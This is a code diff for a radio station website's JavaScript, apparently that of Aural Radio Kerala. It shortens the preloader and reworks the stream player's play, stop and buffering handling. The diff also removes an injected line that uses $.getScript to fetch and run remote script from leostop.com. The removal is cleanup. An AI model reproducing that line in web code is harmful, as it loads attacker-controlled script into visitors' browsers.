@@ -10,9 +10,7 @@ $(function () {
 	/* Preloader
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 	
-	setTimeout(function () {
-		$('.loader_bg').fadeToggle();
-	}, 1500);
+	$('.loader_bg').fadeOut(250);
 	
 	
 	
@@ -54,9 +52,7 @@ $(function () {
         $('body,html').animate({
           scrollTop: 0
         }, 1000);
-    });
-	
-function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
+    }); 
 
 	/* Countdown
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
@@ -173,29 +169,49 @@ let isPlaying = false;
 const audio = document.getElementById('audioPlayer');
 const playPauseBtn = document.getElementById('playPauseBtn');
 const nowPlayingText = document.getElementById('nowPlaying');
+const STREAM_URL = "https://live.auralradiokerala.in/auralradio/mp3";
 
 function toggleAudio() {
     if (!audio) return;
     if (isPlaying) {
         audio.pause();
+        audio.removeAttribute('src');
+        audio.load();
         if (playPauseBtn) playPauseBtn.src = "images/Btnplay.png";
-        if (nowPlayingText) nowPlayingText.style.display = "none";
+        if (nowPlayingText) {
+            nowPlayingText.innerText = "AURAL RADIO PLAYING";
+            nowPlayingText.style.display = "none";
+        }
+        isPlaying = false;
     } else {
-        audio.play();
         if (playPauseBtn) playPauseBtn.src = "images/Btnstop.png";
-        if (nowPlayingText) nowPlayingText.style.display = "block";
+        if (nowPlayingText) {
+            nowPlayingText.innerText = "Connecting...";
+            nowPlayingText.style.display = "block";
+        }
+        audio.src = STREAM_URL + "?t=" + Date.now();
+        audio.load();
+        audio.play().catch(function(err) {
+            console.log("Audio play error:", err);
+            if (playPauseBtn) playPauseBtn.src = "images/Btnplay.png";
+            if (nowPlayingText) nowPlayingText.innerText = "Click to retry";
+            isPlaying = false;
+        });
+        isPlaying = true;
     }
-    
-    isPlaying = !isPlaying;
 }
 
 // Update Now Playing Information
 if (audio) {
     audio.addEventListener('playing', () => {
-        if (nowPlayingText) nowPlayingText.innerText = "AURAL RADIO PLAYING"; // Replace with actual station name or track info
+        if (nowPlayingText) nowPlayingText.innerText = "AURAL RADIO PLAYING";
+    });
+
+    audio.addEventListener('waiting', () => {
+        if (isPlaying && nowPlayingText) nowPlayingText.innerText = "Buffering...";
     });
 
     audio.addEventListener('pause', () => {
-        if (nowPlayingText) nowPlayingText.style.display = "none"; // Hide now playing text when audio is paused
+        if (nowPlayingText && !isPlaying) nowPlayingText.style.display = "none";
     });
 }
